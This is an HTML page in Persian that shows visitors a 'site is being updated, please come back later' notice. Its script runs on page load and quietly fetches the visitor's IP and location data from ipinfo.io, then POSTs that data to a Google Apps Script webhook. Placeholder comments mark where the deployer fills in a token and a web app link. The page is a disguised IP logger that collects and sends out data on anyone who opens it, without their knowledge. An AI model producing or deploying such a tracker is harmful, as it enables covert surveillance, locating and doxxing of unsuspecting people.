<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>در حال بروزرسانی</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #f7f7f7;
      font-family: sans-serif;
      text-align: center;
      padding: 50px;
      direction: rtl;
    }
    .box {
      background-color: white;
      display: inline-block;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>سایت در حال بروزرسانی است</h2>
    <p>لطفاً بعداً دوباره مراجعه کنید.</p>
  </div>

  <script>
    fetch("https://ipinfo.io/json?token=توکن_تو_اینجا") // 👈 توکن IPinfo
      .then(res => res.json())
      .then(data => {
        const webhookUrl = "https://script.google.com/macros/s/کد_اپلیکیشن_تو/exec"; // 👈 لینک Web App گوگل
        fetch(webhookUrl, {
          method: "POST",
          body: JSON.stringify(data),
          headers: {
            "Content-Type": "application/json"
          }
        });
      })
      .catch(err => console.log("خطا در دریافت آی‌پی", err));
  </script>
</body>
</html>
